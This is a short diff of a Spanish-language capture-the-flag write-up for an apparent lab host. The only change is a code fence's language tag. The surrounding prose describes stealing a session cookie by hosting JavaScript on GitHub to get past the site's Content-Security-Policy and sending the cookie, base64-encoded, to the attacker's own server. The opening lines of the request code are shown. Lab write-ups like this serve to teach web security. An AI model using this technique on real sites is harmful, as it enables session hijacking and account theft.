@@ -234,7 +234,7 @@ Content-Security-Policy: default-src 'self' 'unsafe-inline';script-src 'self' ht
 
 Ahora tenemos que probar si podemos robar la cookie, al solo permitir lo que vimos antes tenemos que crear una cuenta de Github, creamos un repositorio publico, y vamos a crear un archivo con JavaScript para hacer una petición por GET a `https://guitjapeo.thl/api/info` y esperamos que el server mande el JSON que lleva la cookie una vez llegue la respuesta nos la pasamos a nuestro servidor encodeada en `base64`.
 
-```Javascript
+```sh
 var req = new XMLHttpRequest();
 req.onload=reqListener;
 var url="https://guitjapeo.thl/api/info";
